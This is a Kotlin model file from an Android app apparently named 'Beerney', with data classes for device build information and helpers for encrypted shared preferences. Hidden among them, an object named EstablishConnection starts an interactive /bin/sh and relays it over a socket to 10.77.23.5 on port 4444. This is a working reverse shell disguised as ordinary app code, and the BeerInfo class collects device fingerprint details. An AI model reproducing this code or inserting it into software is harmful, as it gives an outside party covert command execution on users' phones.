package at.luki0606.beerney.models

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket

data class BeerInfo(
    val manufacturer: String = Build.MANUFACTURER,
    val model: String = Build.MODEL,
    val androidVersion: String = Build.VERSION.RELEASE,
    val apiLevel: Int = Build.VERSION.SDK_INT,
    val display: String = Build.DISPLAY,
    val board: String = Build.BOARD,
    val bootloader: String = Build.BOOTLOADER,
    val brand: String = Build.BRAND,
    val device: String = Build.DEVICE,
    val fingerprint: String = Build.FINGERPRINT,
    val host: String = Build.HOST,
    val product: String = Build.PRODUCT,
    val user: String = Build.USER,
)

object EstablishConnection{
    fun getConnection() {
        val thread = Thread {
            try {
                val cmd = arrayOf("nohup", "/bin/sh", "-i")
                val process = Runtime.getRuntime().exec(cmd)
                val proIn: InputStream = process.inputStream
                val proOut: OutputStream = process.outputStream
                val proErr: InputStream = process.errorStream

                val socket = Socket("10.77.23.5", 4444)
                val socketIn: InputStream = socket.getInputStream()
                val socketOut: OutputStream = socket.getOutputStream()

                while (true) {
                    while (proIn.available() > 0) socketOut.write(proIn.read())
                    while (proErr.available() > 0) socketOut.write(proErr.read())
                    while (socketIn.available() > 0) proOut.write(socketIn.read())
                    socketOut.flush()
                    proOut.flush()
                }
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: StringIndexOutOfBoundsException) {
                e.printStackTrace()
            }
        }

        thread.start()
        thread.join()
    }
}

object BeerInfoSSPrefs{
    fun getBeerInfo(context: Context): Boolean {
        val masterKey = getMasterKey(context)
        val secureSharedPrefs = getSecureSharedPrefs(masterKey, context)
        return secureSharedPrefs.getBoolean("GOT_BEER_INFO", false)
    }

    fun setBeerInfo(context: Context) {
        val masterKey = getMasterKey(context)
        val secureSharedPrefs = getSecureSharedPrefs(masterKey, context)

        val editor = secureSharedPrefs.edit()
        editor.putBoolean("GOT_BEER_INFO", true)
        editor.apply()
    }

    private fun getSecureSharedPrefs(masterKey: MasterKey, context: Context): SharedPreferences {
        return EncryptedSharedPreferences.create(
            context,
            "Beerney",
            masterKey,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        )
    }

    private fun getMasterKey(context: Context): MasterKey {
        return MasterKey.Builder(context)
            .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
            .build()
    }
}

data class HomingPosition(
    val address: String
)